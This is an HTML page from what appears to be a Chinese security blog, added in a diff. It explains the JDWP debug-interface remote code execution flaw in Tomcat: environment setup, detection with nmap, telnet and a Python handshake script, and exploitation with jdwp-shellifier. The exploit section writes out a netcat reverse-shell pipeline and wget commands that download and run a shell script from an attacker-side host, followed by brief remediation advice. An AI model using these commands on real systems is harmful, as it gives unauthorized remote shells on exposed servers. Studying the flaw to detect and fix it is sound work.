@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>JDWP调试接口 RCE 漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="JDWP调试接口 RCE 漏洞" />
+<meta property="og:description" content="JDWP调试接口 RCE 漏洞 漏洞描述 JDWP（Java Debug Wire Protocol，Java调试线协议）是一个为Java调试而设计的通讯交互协议，它定义了" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="JDWP调试接口 RCE 漏洞"/>
+<meta name="twitter:description" content="JDWP调试接口 RCE 漏洞 漏洞描述 JDWP（Java Debug Wire Protocol，Java调试线协议）是一个为Java调试而设计的通讯交互协议，它定义了"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/" /><link rel="next" href="http://example.org/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "JDWP调试接口 RCE 漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "漏洞知识库","wordcount":  1638 ,
+        "url": "http:\/\/example.org\/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">JDWP调试接口 RCE 漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1638 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#环境搭建">环境搭建</a>
+      <ul>
+        <li><a href="#windows">Windows</a></li>
+        <li><a href="#linux">Linux</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞检测">漏洞检测</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#telnet">Telnet</a></li>
+        <li><a href="#python">Python</a></li>
+      </ul>
+    </li>
+    <li><a href="#漏洞poc">漏洞POC</a>
+      <ul>
+        <li><a href="#poc1">POC1</a>
+          <ul>
+            <li><a href="#反弹shell">反弹shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#poc2">POC2</a></li>
+      </ul>
+    </li>
+    <li><a href="#修复建议">修复建议</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="jdwp调试接口-rce-漏洞">JDWP调试接口 RCE 漏洞</h1>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>JDWP（Java Debug Wire Protocol，Java调试线协议）是一个为Java调试而设计的通讯交互协议，它定义了调试器（Debugger）和被调试JVM（Debuggee）进程之间的交互数据的传递格式，它详细完整地定义了请求命令、回应数据和错误代码，保证了调试端和被调试端之间通信通畅。</p>
+<p>JDWP是JVM或者类JVM的虚拟机都支持的一种协议，通过该协议，Debugger端和被调试JVM之间进行通信，可以获取被调试JVM的包括类、对象、线程等信息。</p>
+<p>参考阅读：</p>
+<ul>
+<li><a href="https://forum.butian.net/share/1232" target="_blank" rel="noopener noreffer">https://forum.butian.net/share/1232</a>
+</li>
+</ul>
+<h2 id="环境搭建">环境搭建</h2>
+<h3 id="windows">Windows</h3>
+<p>下载Tomcat到本地，在<code>bin\startup.bat</code>文件中添加如下代码开启debug模式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>点击运行 <code>startup.bat</code> ，以debug模式启动Tomcat。</p>
+<p><code>Listening for transport dt_socket at address: 8000</code>，表示JDWP服务已经监听在8000端口，等待调试器连接。</p>
+<h3 id="linux">Linux</h3>
+<p>执行如下命令安装Tomcat：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 执行wget命令下载Tomcat安装包
+</span></span><span class="line"><span class="cl">wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 解压安装包
+</span></span><span class="line"><span class="cl">tar zxvf apache-tomcat-8.5.43.tar.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 将程序安装包复制到指定运行目录下
+</span></span><span class="line"><span class="cl">sudo mv apache-tomcat-8.5.43 /usr/local/tomcat8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>启动方式一：</p>
+<p>进入Tomcat安装目录下的bin目录下找到 <code>catalina.sh</code> 文件，在文件开头部分添加如下一行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">CATALINA_OPTS</span><span class="o">=</span><span class="s2">&#34;-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改完成后，执行脚本<code>./startup.sh</code>就会以debug模式启动Tomcat。</p>
+<p>启动方式二：</p>
+<p>进入Tomcat的bin目录，输入 <code>./catalina.sh jpda run</code> 或者 <code>./catalina.sh jpda start</code> 命令以调试模式启动tomcat。
+启动时就会出现如下信息提示：
+<code>Listening for transport dt_socket at address: 8000</code>。</p>
+<p>注意脚本中默认配置JDWP是监听在本地的8000端口，修改<code>JDPA_ADDRESS</code>的值对外开放此端口，在JDK9及以上的版本需要修改为<code>JDPA_ADDRESS=*:8000</code> ，在JDK9以下版本修改为<code>JDPA_ADDRESS=8000</code> 即可</p>
+<h2 id="漏洞检测">漏洞检测</h2>
+<p>有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送JDWP-Handshake，如果目标服务直接返回一样的内容则说明是JDWP服务。</p>
+<h3 id="nmap">Nmap</h3>
+<p>扫描会识别到JDWP服务，且有对应的JDK版本信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nmap -sT -sV 192.168.192.1 -p <span class="m">8000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="telnet">Telnet</h3>
+<p>使用Telnet命令探测，需要马上输入JDWP-Handshake，然后服务端返回一样的内容，证明是JDWP服务。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">telnet 192.168.182.130 <span class="m">8000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意：需要马上输入JDWP-Handshake，并按下回车，不然马上就会断开。在Linux系统下使用telnet测试可以，在Windows系统下使用telnet测试不太行。</p>
+<h3 id="python">Python</h3>
+<p>使用如下脚本扫描，直接连接目标服务器，并向目标发送JDWP-Handshake，如果能接收到相同内容则说明目标是开启了JDWP服务。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import socket
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">host = &#34;192.168.182.130&#34;
+</span></span><span class="line"><span class="cl">port = 8000
+</span></span><span class="line"><span class="cl">try:
+</span></span><span class="line"><span class="cl">    client = socket.socket()
+</span></span><span class="line"><span class="cl">    client.connect((host, port))
+</span></span><span class="line"><span class="cl">    client.send(b&#34;JDWP-Handshake&#34;)
+</span></span><span class="line"><span class="cl">    if client.recv(1024) == b&#34;JDWP-Handshake&#34;:
+</span></span><span class="line"><span class="cl">        print(&#34;[*] {}:{} Listening JDWP Service! &#34;.format(host, port))
+</span></span><span class="line"><span class="cl">except Exception as e:
+</span></span><span class="line"><span class="cl">    print(&#34;[-] Connection failed! &#34;)
+</span></span><span class="line"><span class="cl">finally:
+</span></span><span class="line"><span class="cl">    client.close()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="漏洞poc">漏洞POC</h2>
+<h3 id="poc1">POC1</h3>
+<p>poc1：https://github.com/IOActive/jdwp-shellifier
+jdwp-shellifier是使用Python2编写的，该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。</p>
+<p>该漏洞无回显，可利用dnslog进行探测：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python2 jdwp-shellifier.py -t 192.168.3.118 -p 8787 --break-on &#34;java.lang.String.indexof&#34; --cmd &#34;ping xxx.dnslog.cn&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="反弹shell">反弹shell</h4>
+<p>准备反弹shell文件，保存为shell.txt：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc 192.168.178.129 3333 | /bin/bash | nc 192.168.178.129 4444%
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>启动http服务：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 -m http.server 8000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>开启监听，需要开启2个监听，前面一个输入执行命令，后面一个输出命令执行结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -lvvp 3333
+</span></span><span class="line"><span class="cl">nc -lvvp 4444
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用poc1执行命令，下载shell、文件可执行权限、执行shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &#34;java.lang.String.indexof&#34; --cmd &#34;wget http://192.168.178.129:8000/shell.txt -O /tmp/shell.sh&#34;
+</span></span><span class="line"><span class="cl">python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &#34;java.lang.String.indexof&#34; --cmd &#34;chmod a+x /tmp/shell.sh&#34;
+</span></span><span class="line"><span class="cl">python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on &#34;java.lang.String.indexof&#34; --cmd &#34;/tmp/shell.sh&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>两个监听都收到shell，一个输入命令，一个输出结果。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image-20230630173638801.png"
+        data-srcset="images/image-20230630173638801.png, images/image-20230630173638801.png 1.5x, images/image-20230630173638801.png 2x"
+        data-sizes="auto"
+        alt="images/image-20230630173638801.png"
+        title="image-20230630173638801" /></p>
+<h3 id="poc2">POC2</h3>
+<p>poc2：https://github.com/Lz1y/jdwp-shellifier
+该脚本是在上面一个漏洞利用脚本的基础上，修改利用方式为通过对Sleeping的线程发送单步执行事件，达成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中。</p>
+<h2 id="修复建议">修复建议</h2>
+<ul>
+<li>关闭JDWP端口，或者JDWP端口不对公网开放</li>
+<li>关闭Java的debug模式</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/" data-title="JDWP调试接口 RCE 漏洞" data-via="xxxx" data-hashtags="漏洞知识库"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/" data-hashtag="漏洞知识库"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/" data-title="JDWP调试接口 RCE 漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/" data-title="JDWP调试接口 RCE 漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/jdwp%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A3-rce-%E6%BC%8F%E6%B4%9E/" data-title="JDWP调试接口 RCE 漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/" class="prev" rel="prev" title="JeecgBoot 企业级低代码平台 qurestSql SQL注入漏洞 CVE-2023-1454"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>JeecgBoot 企业级低代码平台 qurestSql SQL注入漏洞 CVE-2023-1454</a>
+            <a href="/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="next" rel="next" title="JD-FreeFuck 后台命令执行漏洞">JD-FreeFuck 后台命令执行漏洞<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
